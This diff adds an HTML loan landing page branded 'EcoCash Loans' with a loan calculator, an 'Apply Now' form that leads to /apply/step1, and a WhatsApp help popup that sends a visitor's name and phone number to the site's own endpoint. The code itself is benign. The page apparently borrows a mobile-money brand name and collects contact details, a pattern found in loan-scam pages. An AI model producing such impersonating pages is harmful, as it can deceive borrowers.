@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash Loans — Quick Approval</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        :root {
+            --bg: #0b1118;
+            --card: #121b26;
+            --elevated: #182433;
+            --accent: #00b86b;
+            --accent-hover: #009e5b;
+            --text: #f4f7fb;
+            --muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
+        }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
+            padding: 20px 16px 36px;
+        }
+        .wrap { max-width: 440px; margin: 0 auto; }
+        .topbar {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 18px;
+        }
+        .brand {
+            font-weight: 800; font-size: 1.25rem; letter-spacing: -0.02em;
+        }
+        .brand span.eco { color: #38bdf8; }
+        .brand span.cash { color: #f43f5e; }
+        .card-modern {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 22px;
+            padding: 24px 20px;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+        }
+        .calc-box {
+            background: var(--elevated);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 18px 16px;
+            margin: 18px 0;
+        }
+        .stat-value { color: #34d399; font-weight: 700; }
+        .estimate-pill {
+            background: rgba(0, 184, 107, 0.1);
+            border: 1px solid rgba(52, 211, 153, 0.25);
+            border-radius: 14px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 14px;
+        }
+        .btn-eco {
+            background: var(--accent);
+            color: #05120c;
+            font-weight: 700;
+            border: none;
+            border-radius: 14px;
+            padding: 14px;
+            width: 100%;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
+        input[type="range"] { accent-color: var(--accent); width: 100%; }
+
+        .wa-float {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #25d366;
+            color: #ffffff;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.45);
+            z-index: 900;
+            cursor: pointer;
+            transition: transform 0.15s ease, background 0.15s ease;
+        }
+        .wa-float:hover {
+            background: #1ebe5d;
+            transform: translateY(-2px);
+        }
+        .wa-popup {
+            position: fixed;
+            right: 20px;
+            bottom: 88px;
+            width: 310px;
+            max-width: calc(100vw - 32px);
+            background: var(--card);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 18px;
+            box-shadow: 0 22px 50px rgba(0, 0, 0, 0.6);
+            z-index: 950;
+            display: none;
+            overflow: hidden;
+        }
+        .wa-popup.is-open {
+            display: block;
+        }
+        .wa-popup-header {
+            background: var(--elevated);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: grab;
+            user-select: none;
+            touch-action: none;
+        }
+        .wa-popup-header:active {
+            cursor: grabbing;
+        }
+        .wa-close-btn {
+            background: transparent;
+            border: none;
+            color: var(--muted);
+            font-size: 1.15rem;
+            line-height: 1;
+            padding: 0 4px;
+            cursor: pointer;
+        }
+        .wa-close-btn:hover {
+            color: var(--text);
+        }
+        .wa-popup-body {
+            padding: 14px;
+        }
+        .wa-input {
+            width: 100%;
+            background: var(--elevated);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            color: var(--text);
+            border-radius: 10px;
+            padding: 10px 12px;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+        .wa-input:focus {
+            outline: none;
+            border-color: #25d366;
+        }
+        .wa-send-btn {
+            width: 100%;
+            background: #25d366;
+            color: #062111;
+            font-weight: 700;
+            border: none;
+            border-radius: 11px;
+            padding: 10px 12px;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+        .wa-send-btn:hover {
+            background: #1ebe5d;
+        }
+        .wa-feedback {
+            font-size: 0.8rem;
+            margin-top: 8px;
+            min-height: 18px;
+            color: #34d399;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="topbar">
+            <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <span class="small" style="color: var(--muted);">Instant Wallet Credit</span>
+        </div>
+
+        <div class="card-modern">
+            <h1 class="fw-bold fs-3 mb-2">Get Your Loan Approved Fast</h1>
+            <p class="small mb-0" style="color: var(--muted);">Quick review · Transparent terms · Flexible repayment</p>
+
+            <form action="/apply/step1" method="GET">
+                <div class="calc-box">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <span class="fw-semibold small">Loan Amount</span>
+                        <span id="amtLabel" class="stat-value fs-5">$1,500</span>
+                    </div>
+                    <input type="range" id="amtRange" min="100" max="5000" step="50" value="1500">
+                    <input type="hidden" name="amount" id="amountInput" value="1500">
+                    <div class="d-flex justify-content-between small mt-1" style="color: var(--muted);">
+                        <span>$100</span><span>$5,000</span>
+                    </div>
+
+                    <hr style="border-color: var(--border); margin: 16px 0;">
+
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <span class="fw-semibold small">Loan Term</span>
+                        <span id="termLabel" class="stat-value">6 months</span>
+                    </div>
+                    <input type="range" id="termRange" min="1" max="12" step="1" value="6">
+                    <input type="hidden" name="term" id="termInput" value="6 months">
+                    <div class="d-flex justify-content-between small mt-1" style="color: var(--muted);">
+                        <span>1 month</span><span>12 months</span>
+                    </div>
+
+                    <div class="estimate-pill">
+                        <span class="small" style="color: var(--muted);">Estimated Monthly</span>
+                        <span id="monthlyVal" class="fs-5 fw-bold text-white">$275.00</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-eco shadow-sm">Apply Now</button>
+            </form>
+        </div>
+    </div>
+
+    <button type="button" id="waFloatBtn" class="wa-float" aria-label="WhatsApp Help">
+        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 16 16">
+            <path d="M13.601 2.326A7.85 7.85 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.9 7.9 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.925a7.89 7.89 0 0 0-2.323-5.612m-5.607 12.21h-.003c-1.17 0-2.317-.315-3.318-.91l-.238-.141-2.495.654.666-2.433-.155-.247a6.56 6.56 0 0 1-1.007-3.504c.003-3.62 2.95-6.566 6.573-6.566a6.52 6.52 0 0 1 4.643 1.925 6.52 6.52 0 0 1 1.921 4.648c-.003 3.62-2.95 6.564-6.566 6.564m3.6-4.918c-.197-.099-1.167-.576-1.348-.642-.181-.066-.313-.099-.445.099-.132.197-.511.642-.627.774-.115.132-.231.148-.428.05-.198-.099-.835-.308-1.59-.981-.588-.524-.985-1.172-1.1-1.37-.116-.197-.012-.304.087-.402.089-.088.198-.23.297-.346.099-.115.132-.198.198-.33.066-.131.033-.247-.017-.346s-.445-1.072-.61-1.468c-.16-.385-.324-.333-.445-.34l-.379-.007c-.132 0-.346.05-.527.247-.181.198-.692.676-.692 1.648s.709 1.912.808 2.044c.099.132 1.395 2.13 3.38 2.987.472.204.841.326 1.128.417.474.151.906.13 1.247.079.38-.057 1.167-.477 1.332-.938s.165-.856.115-.938c-.049-.082-.181-.132-.379-.23"/>
+        </svg>
+    </button>
+
+    <div id="waPopup" class="wa-popup" role="dialog" aria-label="WhatsApp Support">
+        <div id="waDragHandle" class="wa-popup-header">
+            <span class="fw-semibold small">💬 WhatsApp Support (Drag)</span>
+            <button type="button" id="waCloseBtn" class="wa-close-btn" aria-label="Close">&times;</button>
+        </div>
+        <form id="waHelpForm" class="wa-popup-body">
+            <input type="text" id="waNameInput" class="wa-input" placeholder="Your full name" required>
+            <input type="tel" id="waPhoneInput" class="wa-input" placeholder="WhatsApp number (e.g. +263 77...)" required>
+            <button type="submit" id="waSubmitBtn" class="wa-send-btn">Request WhatsApp Help</button>
+            <div id="waFeedback" class="wa-feedback"></div>
+        </form>
+    </div>
+
+    <script>
+        const amtRange = document.getElementById("amtRange");
+        const termRange = document.getElementById("termRange");
+        const amtLabel = document.getElementById("amtLabel");
+        const termLabel = document.getElementById("termLabel");
+        const monthlyVal = document.getElementById("monthlyVal");
+        const amountInput = document.getElementById("amountInput");
+        const termInput = document.getElementById("termInput");
+
+        function updateCalc() {
+            const amt = Number(amtRange.value);
+            const months = Number(termRange.value);
+            amtLabel.textContent = "$" + amt.toLocaleString();
+            termLabel.textContent = months + (months === 1 ? " month" : " months");
+            amountInput.value = amt;
+            termInput.value = months + (months === 1 ? " month" : " months");
+
+            // Simple illustrative monthly estimate (principal + 4% monthly rate)
+            const total = amt * (1 + 0.04 * months);
+            monthlyVal.textContent = "$" + (total / months).toFixed(2);
+        }
+
+        amtRange.addEventListener("input", updateCalc);
+        termRange.addEventListener("input", updateCalc);
+        updateCalc();
+
+        (function () {
+            const floatBtn = document.getElementById("waFloatBtn");
+            const popup = document.getElementById("waPopup");
+            const dragHandle = document.getElementById("waDragHandle");
+            const closeBtn = document.getElementById("waCloseBtn");
+            const form = document.getElementById("waHelpForm");
+            const feedback = document.getElementById("waFeedback");
+            const submitBtn = document.getElementById("waSubmitBtn");
+
+            floatBtn.addEventListener("click", () => {
+                popup.classList.toggle("is-open");
+                feedback.textContent = "";
+            });
+
+            closeBtn.addEventListener("click", () => {
+                popup.classList.remove("is-open");
+            });
+
+            let dragging = false;
+            let offsetX = 0;
+            let offsetY = 0;
+
+            dragHandle.addEventListener("pointerdown", (e) => {
+                if (e.target === closeBtn) return;
+                const rect = popup.getBoundingClientRect();
+                popup.style.left = rect.left + "px";
+                popup.style.top = rect.top + "px";
+                popup.style.right = "auto";
+                popup.style.bottom = "auto";
+                offsetX = e.clientX - rect.left;
+                offsetY = e.clientY - rect.top;
+                dragging = true;
+                dragHandle.setPointerCapture(e.pointerId);
+            });
+
+            dragHandle.addEventListener("pointermove", (e) => {
+                if (!dragging) return;
+                const maxX = window.innerWidth - popup.offsetWidth - 8;
+                const maxY = window.innerHeight - popup.offsetHeight - 8;
+                const nextLeft = Math.max(8, Math.min(e.clientX - offsetX, maxX));
+                const nextTop = Math.max(8, Math.min(e.clientY - offsetY, maxY));
+                popup.style.left = nextLeft + "px";
+                popup.style.top = nextTop + "px";
+            });
+
+            dragHandle.addEventListener("pointerup", () => {
+                dragging = false;
+            });
+
+            form.addEventListener("submit", async (e) => {
+                e.preventDefault();
+                const name = document.getElementById("waNameInput").value.trim();
+                const whatsapp = document.getElementById("waPhoneInput").value.trim();
+                if (!name || !whatsapp) return;
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = "Sending...";
+                feedback.style.color = "#94a3b8";
+                feedback.textContent = "";
+
+                try {
+                    const res = await fetch("/whatsapp-help", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            name,
+                            whatsapp,
+                            page: window.location.pathname
+                        })
+                    });
+                    const data = await res.json();
+                    if (res.ok && data.ok) {
+                        feedback.style.color = "#34d399";
+                        feedback.textContent = data.message || "Sent! We will message you on WhatsApp.";
+                        form.reset();
+                    } else {
+                        feedback.style.color = "#f87171";
+                        feedback.textContent = data.error || "Could not send request.";
+                    }
+                } catch (err) {
+                    feedback.style.color = "#f87171";
+                    feedback.textContent = "Network error. Please try again.";
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = "Request WhatsApp Help";
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
